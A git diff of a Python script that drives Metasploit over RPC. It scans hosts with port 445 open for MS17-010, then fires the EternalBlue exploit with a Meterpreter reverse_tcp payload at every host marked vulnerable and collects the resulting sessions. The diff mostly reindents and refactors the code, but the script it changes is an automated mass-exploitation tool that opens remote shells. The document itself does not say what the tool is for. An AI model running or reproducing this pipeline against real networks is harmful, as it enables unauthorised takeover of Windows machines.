@@ -8,7 +8,7 @@ import socket
 def script_automate_scan():
     '''
 
-    @return: json data from the metasploit console, the rpc client and the console associated to this client
+    @return: list data from the metasploit console, the rpc client and the console associated to this client
     '''
     # check opened port
     opened_vuln_port, ip_vuln = look_for_port()
@@ -28,6 +28,7 @@ def script_automate_scan():
     hostname = s.getsockname()[0]
     s.close()
 
+    # pdb.set_trace()
     #######################################CHECK OPENED PORT####################################
     if '445' in opened_vuln_port:
         auxiliary_scan = 'auxiliary/scanner/smb/smb_ms17_010'
@@ -44,22 +45,24 @@ def script_automate_scan():
             data_console = main_enter_console_for_scan(auxiliary_scan, ip, console)
             # pdb.set_trace()
             if data_console != -1:
-                if ' Host is likely VULNERABLE to MS17-010!' in data_console['data']:
-                    data_read_out.append('ip : ' + str(ip) + ' ; ' + ' Host is likely VULNERABLE to '+ exploit_name)
+                if 'Host is likely VULNERABLE to MS17-010!' in data_console['data']:
+                    data_read_out.append('ip : ' + str(ip) + ' ; ' + ' Host is likely VULNERABLE to : ' + exploit_name)
+                elif 'OptionValidateError' in data_console['data']:
+                    data_read_out.append('ip : ' + str(ip) + ' ; ' + ' OptionValidateError : Auxiliary failed : ' + exploit_name)
         return data_read_out, client, console
 
 
 def script_automate_exploit(data_read_out, client, console):
     '''
 
-    @param data_read_out: json data from the metasploit console
+    @param data_read_out: list data from the metasploit console
     @param client: client rpc
     @param console: console associated to the client rpc
     @return: rpc client with the created sessions for this client
     '''
     # check opened port
     opened_vuln_port, ip_vuln = look_for_port()
-    ip_vuln_reconf=[]
+    ip_vuln_reconf = []
     # print(opened_vuln_port)
 
     # test with putting an unexploitable
@@ -74,38 +77,44 @@ def script_automate_exploit(data_read_out, client, console):
     hostname = s.getsockname()[0]
     s.close()
 
+    # pdb.set_trace()
+    #extract ip from data_read_outh which is a list of string which mentions possible vulnerable ip
     for data in data_read_out:
-     for ip in ip_vuln:
-         if ip[0] in data and ip[0] not in ip_vuln_reconf:
-             ip_vuln_reconf.append(ip[0])
+        for ip in ip_vuln:
+            if ip[0] in data and ip[0] not in ip_vuln_reconf:
+                ip_vuln_reconf.append(ip[0])
 
-    #######################################CONFIG EXPLOIT####################################
-    auxiliary_scan = 'auxiliary/scanner/smb/smb_ms17_010'
-    exploit_name = 'windows/smb/ms17_010_eternalblue'
+    for str_data in data_read_out:
+        if 'eternalblue' in str_data:
+            #######################################CONFIG EXPLOIT####################################
+            auxiliary_scan = 'auxiliary/scanner/smb/smb_ms17_010'
+            exploit_name = 'windows/smb/ms17_010_eternalblue'
 
-    #####################################GET EXPLOIT########################################
+            #####################################GET EXPLOIT########################################
 
-    exploit = main_run_exploit(exploit_name, client)
+            exploit = main_run_exploit(exploit_name, client)
 
-    #######################################CONFIG OPTIONS AND PAYLOAD#######################
+            #######################################CONFIG OPTIONS AND PAYLOAD#######################
 
-    #pdb.set_trace()
-    running_config_exploit = main_change_option_exploit('CheckModule', auxiliary_scan, 'STR', exploit)
+            # pdb.set_trace()
+            running_config_exploit = main_change_option_exploit('CheckModule', auxiliary_scan, 'STR', exploit)
 
-    payload = main_choose_payload('windows/x64/meterpreter/reverse_tcp', client)
-    running_config_payload = main_config_payload('LHOST', hostname, 'STR', payload)
+            payload = main_choose_payload('windows/x64/meterpreter/reverse_tcp', client)
+            running_config_payload = main_config_payload('LHOST', hostname, 'STR', payload)
 
-    for ip in ip_vuln_reconf:
-        # print(ip)
-        main_change_option_exploit('RHOSTS', ip, 'STR', exploit)
-        json, session_create = main_exe_exploit(payload, exploit, client)
+            for ip in ip_vuln_reconf:
+                # print(ip)
+                main_change_option_exploit('RHOSTS', ip, 'STR', exploit)
+                json_data, session_create = main_exe_exploit(payload, exploit, client)
 
-    print(client.sessions.list)
-    sessions_created = client.sessions.list
-    return client, sessions_created
+                # if session_create == -1:
 
 
+            print(client.sessions.list)
+            sessions_created = client.sessions.list
+            return client, sessions_created
 
+    return client, -1
 
 # data, client, console = script_automate_scan()
 # print(data, client, console)
